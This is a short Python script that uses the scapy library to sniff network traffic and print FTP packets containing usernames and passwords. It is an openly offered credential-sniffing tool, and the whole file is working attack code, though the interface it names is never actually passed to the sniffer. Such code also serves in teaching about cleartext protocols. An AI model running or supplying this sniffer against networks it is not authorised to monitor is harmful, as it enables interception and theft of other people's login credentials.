#!/usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import print_function
import sys
from scapy.all import *


def check_ftp(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[TCP].dport == 21 or packet[TCP].sport == 21:
            return True
        else:
            return False

def check_packet(packet):
    if check_ftp(packet):
        pass
    else:
        return
    data = packet[Raw].load
    if 'user' in data.lower() or 'pass' in data.lower():
        print("[*] Server: %s -> %s" % (packet[IP].dst, packet[IP].src))
        print("[*] %s" % packet[TCP].payload)

if __name__ == '__main__':
    interface = 'wlan0'
    print('[*] Sniffing Started on %s...' % interface)

    try:
        sniff(prn=check_packet, store=0)
    except Exception:
        print('[!] Error: Failed to Initialize Sniffing')
        sys.exit(1)

    print('[*] Sniffing Stopped')
